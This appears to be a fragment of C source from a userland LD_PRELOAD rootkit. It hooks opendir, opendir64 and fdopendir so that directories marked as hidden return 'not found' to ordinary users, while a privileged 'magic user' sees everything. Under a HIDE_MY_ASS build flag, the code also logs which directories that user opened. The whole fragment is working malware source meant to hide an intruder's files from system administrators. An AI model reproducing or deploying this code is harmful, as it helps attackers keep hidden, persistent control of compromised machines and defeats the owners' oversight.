DIR *opendir(const char *pathname){
    hook(COPENDIR);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        DIR *ret = call(COPENDIR, pathname);
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
        return ret;
#else
        return call(COPENDIR, pathname);
#endif
    }
    if(hidden_path(pathname)) { errno = ENOENT; return NULL; }
    return call(COPENDIR, pathname);
}

DIR *opendir64(const char *pathname){
    hook(COPENDIR64);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        DIR *ret = call(COPENDIR64, pathname);
        if(ret && !pathtracked(pathname))
            trackwrite(pathname);
        return ret;
#else
        return call(COPENDIR64, pathname);
#endif
    }
    if(hidden_path(pathname)) { errno = ENOENT; return NULL; }
    return call(COPENDIR64, pathname);
}

DIR *fdopendir(int fd){
    hook(CFDOPENDIR);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        DIR *ret = call(CFDOPENDIR, fd);
        if(ret){
            char *apath = gdirname(fd);
            if(apath != NULL){
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
        }
        return ret;
#else
        return call(CFDOPENDIR, fd);
#endif
    }
    if(hidden_fd(fd)) { errno = ENOENT; return NULL; }
    return call(CFDOPENDIR, fd);
}
